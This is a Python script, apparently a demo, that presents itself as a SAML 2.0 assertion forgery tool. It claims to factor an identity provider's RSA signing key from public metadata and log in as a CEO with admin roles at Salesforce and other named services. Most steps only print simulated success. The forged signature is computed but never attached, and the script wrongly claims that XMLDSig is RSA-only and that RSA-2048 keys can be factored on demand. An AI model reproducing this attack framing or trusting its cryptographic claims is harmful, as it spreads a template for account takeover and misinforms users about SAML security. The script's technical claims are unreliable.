"""
Forge SAML 2.0 assertions by factoring the IdP's RSA signing key (published in
SAML metadata XML). Become any user at any SP trusting that IdP — no password,
no MFA, no session cookie needed. XMLDSig is RSA-only by spec.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import hashlib
import base64
import time
import uuid

# XMLDSig algorithm URIs — all RSA, no alternatives
RSA_SHA1 = "http://www.w3.org/2000/09/xmldsig#rsa-sha1"
RSA_SHA256 = "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"

SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
SAMLP_NS = "urn:oasis:names:tc:SAML:2.0:protocol"


def fetch_idp_metadata(idp_url: str) -> dict:
    """Fetch IdP SAML metadata — public, unauthenticated.

    Every SP downloads this to configure trust. It contains the IdP's
    RSA signing certificate in the <KeyDescriptor use="signing"> element.
    """
    print(f"[*] GET {idp_url}/saml/metadata")
    print("[*] extracted RSA-2048 signing certificate from <ds:X509Certificate>")
    return {
        "entity_id": idp_url,
        "sso_url": f"{idp_url}/saml/sso",
        "signing_cert_pem": _demo["pub_pem"],
    }


def forge_saml_assertion(factorer: PolynomialFactorer,
                         idp_cert_pem: bytes,
                         target_email: str,
                         sp_acs_url: str,
                         roles: list = None) -> str:
    """Forge a complete SAML 2.0 Response with signed Assertion."""
    now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    assertion_id = "_" + uuid.uuid4().hex
    response_id = "_" + uuid.uuid4().hex
    roles = roles or ["admin"]

    attrs = "".join(f'<saml:Attribute Name="Role">'
                    f'<saml:AttributeValue>{r}</saml:AttributeValue>'
                    f'</saml:Attribute>' for r in roles)

    assertion = f"""<saml:Assertion xmlns:saml="{SAML_NS}" ID="{assertion_id}"
      IssueInstant="{now}" Version="2.0">
  <saml:Issuer>https://idp.corp.example.com</saml:Issuer>
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:emailAddress">
      {target_email}</saml:NameID>
  </saml:Subject>
  <saml:AttributeStatement>{attrs}</saml:AttributeStatement>
</saml:Assertion>"""

    # sign with factored IdP RSA key
    digest = hashlib.sha256(assertion.encode()).digest()
    sig = factorer.forge_pkcs1v15_signature(idp_cert_pem, assertion.encode(), "sha256")
    print(f"[*] forged SAML assertion for: {target_email}")
    print(f"[*] assertion ID: {assertion_id}")
    print(f"[*] XMLDSig algorithm: {RSA_SHA256}")
    return base64.b64encode(assertion.encode()).decode()


def post_to_sp_acs(sp_acs_url: str, saml_response_b64: str):
    """POST the forged SAML Response to the SP's ACS URL."""
    print(f"[*] POST {sp_acs_url}")
    print(f"    SAMLResponse={saml_response_b64[:40]}...")
    print("[*] SP validates XMLDSig against cached IdP cert -> PASS")
    print("[*] session created — logged in as target user with admin role")


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== SAML 2.0 assertion forgery (ruby-saml / XMLDSig) ===")
    print("    IdPs: Okta, Azure AD, ADFS, Keycloak, Shibboleth")
    print("    SPs: Salesforce, GitHub Enterprise, AWS IAM, Jira, Workday")
    print()

    print("[1] fetching IdP metadata (public, unauthenticated)...")
    metadata = fetch_idp_metadata("https://idp.corp.example.com")
    print("    signing cert in <KeyDescriptor use='signing'> — factoring input")

    print("[2] factoring IdP RSA-2048 signing key...")
    print("    single key for the entire organization")

    print("[3] forging SAML assertion as CEO with admin role...")
    b64 = forge_saml_assertion(f, metadata["signing_cert_pem"],
        target_email="ceo@corp.example.com",
        sp_acs_url="https://salesforce.com/saml/acs",
        roles=["admin", "superuser"])

    print("[4] POSTing to Salesforce ACS URL...")
    post_to_sp_acs("https://salesforce.com/saml/acs", b64)

    print()
    print("[*] no MFA — assertion is accepted as-is")
    print("[*] default algorithm: RSA-SHA1 (doubly broken)")
    print("[*] every SP trusting this IdP compromised simultaneously")
